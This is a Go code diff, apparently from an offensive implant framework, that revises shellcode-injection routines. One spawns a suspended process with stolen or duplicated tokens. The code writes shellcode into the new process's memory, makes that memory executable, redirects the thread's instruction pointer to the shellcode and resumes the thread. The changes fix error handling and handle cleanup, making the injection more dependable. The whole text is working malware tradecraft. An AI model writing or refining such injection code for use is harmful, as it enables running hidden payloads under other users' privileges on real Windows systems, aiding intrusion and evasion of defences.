@@ -217,38 +217,38 @@ func SpawnInjectWithCreds(shellcode []byte, args []string) (string, error) {
 	var lens uint64 = uint64(len(shellcode))
 	lpBaseAddress, err = rawapi.NtAllocateVirtualMemory(uintptr(pi.Process), lpBaseAddress, 0, lens, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if err != nil || lpBaseAddress == 0 {
+		windows.TerminateProcess(pi.Process, 0)
 		return "", err
 	}
 	var nBytesWritten *uint32
 	err = rawapi.NtWriteVirtualMemory(uintptr(pi.Process), lpBaseAddress, uintptr(unsafe.Pointer((&shellcode[0]))), uintptr(lens), nBytesWritten)
 	if err != nil {
-		windows.CloseHandle(windows.Handle(pi.Process))
+		windows.TerminateProcess(pi.Process, 0)
 		return "", err
 	}
 	err = rawapi.NtProtectVirtualMemory(uintptr(pi.Process), lpBaseAddress, &shellcodelen, newFlProtect, &flProtect)
 	if err != nil {
-		windows.CloseHandle(windows.Handle(pi.Process))
-		return "", err
-	}
-	if err != nil {
+		windows.TerminateProcess(pi.Process, 0)
 		return "", err
 	}
 	ctx := winapi.CONTEXT{}
 	ctx.ContextFlags = winapi.CONTEXT_CONTROL
 	err = winapi.GetThreadContext(uintptr(pi.Thread), &ctx)
 	if err != nil {
+		windows.TerminateProcess(pi.Process, 0)
 		return "", err
 	}
 	ctx.Rip = winapi.DWORD64(lpBaseAddress)
 	err = winapi.SetThreadContext(uintptr(pi.Thread), &ctx)
 	if err != nil {
+		windows.TerminateProcess(pi.Process, 0)
 		return "", err
 	}
 	_, err = windows.ResumeThread(windows.Handle(pi.Thread))
 	if err != nil {
+		windows.TerminateProcess(pi.Process, 0)
 		return "", err
 	}
-	windows.ResumeThread(windows.Handle(pi.Thread))
 	go func() {
 		windows.WaitForSingleObject(windows.Handle(pi.Thread), windows.INFINITE)
 		windows.TerminateProcess(pi.Process, 0)
@@ -267,26 +267,59 @@ func SpawnInjectWithToken(shellcode []byte, exeToSpawn string, pidStr string) (s
 	}
 	var hToken windows.Token
 	var duplicatedToken windows.Token
-	err = windows.OpenProcessToken(hProc, windows.TOKEN_IMPERSONATE|windows.TOKEN_DUPLICATE, &hToken)
+	err = windows.OpenProcessToken(hProc, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &hToken)
 	if err != nil {
+		windows.CloseHandle(hProc)
 		return "", err
 	}
-	err = windows.DuplicateTokenEx(hToken, windows.MAXIMUM_ALLOWED, nil, 2, windows.TokenImpersonation, &duplicatedToken)
+	err = windows.DuplicateTokenEx(hToken, windows.MAXIMUM_ALLOWED, nil, 2, windows.TokenPrimary, &duplicatedToken)
 	if err != nil {
+		windows.CloseHandle(hProc)
+		windows.CloseHandle(windows.Handle(hToken))
 		return "", err
 	}
-	var si windows.StartupInfo
-	var pi windows.ProcessInformation
-	exePtr, err := syscall.UTF16PtrFromString(exeToSpawn)
-	if err != nil {
+	si := &windows.StartupInfo{}
+	si.ShowWindow = winapi.ShowWindow
+	si.Flags = si.Flags | winapi.STARTF_USESHOWWINDOW
+	pi := &windows.ProcessInformation{}
+	binaryArgs := syscall.StringToUTF16Ptr(exeToSpawn)
+	ok, err := winapi.CreateProcessWithTokenW(syscall.Handle(duplicatedToken), 2, binaryArgs, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, 0, si, pi)
+	if !ok {
+		windows.CloseHandle(hProc)
+		windows.CloseHandle(windows.Handle(hToken))
+		windows.CloseHandle(windows.Handle(duplicatedToken))
 		return "", err
 	}
-	err = windows.CreateProcessAsUser(duplicatedToken, nil, exePtr, nil, nil, false, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, &si, &pi)
-	if err != nil {
+	var flProtect uint32 = windows.PAGE_READWRITE
+	var newFlProtect uint32 = windows.PAGE_EXECUTE_READ
+	var shellcodelen uintptr = uintptr(len(shellcode))
+	var lpBaseAddress uintptr = 0
+	var lens uint64 = uint64(len(shellcode))
+	lpBaseAddress, err = rawapi.NtAllocateVirtualMemory(uintptr(pi.Process), lpBaseAddress, 0, lens, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil || lpBaseAddress == 0 {
+		windows.CloseHandle(hProc)
+		windows.CloseHandle(windows.Handle(hToken))
+		windows.CloseHandle(windows.Handle(duplicatedToken))
+		windows.TerminateProcess(pi.Process, 0)
 		return "", err
 	}
-	createdPid := strconv.Itoa(int(pi.ProcessId))
-	threadStart, err := RemoteInjectNoThread(shellcode, createdPid)
+	var nBytesWritten *uint32
+	err = rawapi.NtWriteVirtualMemory(uintptr(pi.Process), lpBaseAddress, uintptr(unsafe.Pointer((&shellcode[0]))), uintptr(lens), nBytesWritten)
+	if err != nil {
+		windows.CloseHandle(hProc)
+		windows.CloseHandle(windows.Handle(hToken))
+		windows.CloseHandle(windows.Handle(duplicatedToken))
+		windows.TerminateProcess(pi.Process, 0)
+		return "", err
+	}
+	err = rawapi.NtProtectVirtualMemory(uintptr(pi.Process), lpBaseAddress, &shellcodelen, newFlProtect, &flProtect)
+	if err != nil {
+		windows.CloseHandle(hProc)
+		windows.CloseHandle(windows.Handle(hToken))
+		windows.CloseHandle(windows.Handle(duplicatedToken))
+		windows.TerminateProcess(pi.Process, 0)
+		return "", err
+	}
 	if err != nil {
 		return "", err
 	}
@@ -294,23 +327,37 @@ func SpawnInjectWithToken(shellcode []byte, exeToSpawn string, pidStr string) (s
 	ctx.ContextFlags = winapi.CONTEXT_CONTROL
 	err = winapi.GetThreadContext(uintptr(pi.Thread), &ctx)
 	if err != nil {
+		windows.CloseHandle(hProc)
+		windows.CloseHandle(windows.Handle(hToken))
+		windows.CloseHandle(windows.Handle(duplicatedToken))
+		windows.TerminateProcess(pi.Process, 0)
 		return "", err
 	}
-	ctx.Rip = winapi.DWORD64(threadStart)
+	ctx.Rip = winapi.DWORD64(lpBaseAddress)
 	err = winapi.SetThreadContext(uintptr(pi.Thread), &ctx)
 	if err != nil {
+		windows.CloseHandle(hProc)
+		windows.CloseHandle(windows.Handle(hToken))
+		windows.CloseHandle(windows.Handle(duplicatedToken))
+		windows.TerminateProcess(pi.Process, 0)
 		return "", err
 	}
 	_, err = windows.ResumeThread(windows.Handle(pi.Thread))
 	if err != nil {
+		windows.CloseHandle(hProc)
+		windows.CloseHandle(windows.Handle(hToken))
+		windows.CloseHandle(windows.Handle(duplicatedToken))
+		windows.TerminateProcess(pi.Process, 0)
 		return "", err
 	}
-	windows.ResumeThread(windows.Handle(pi.Thread))
 	go func() {
 		windows.WaitForSingleObject(windows.Handle(pi.Thread), windows.INFINITE)
 		windows.TerminateProcess(pi.Process, 0)
 	}()
-	return fmt.Sprintf("[+] Success Created PID %s", createdPid), nil
+	windows.CloseHandle(hProc)
+	windows.CloseHandle(windows.Handle(hToken))
+	windows.CloseHandle(windows.Handle(duplicatedToken))
+	return fmt.Sprintf("[+] Success Created PID %d", pi.ProcessId), nil
 }
 
 func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
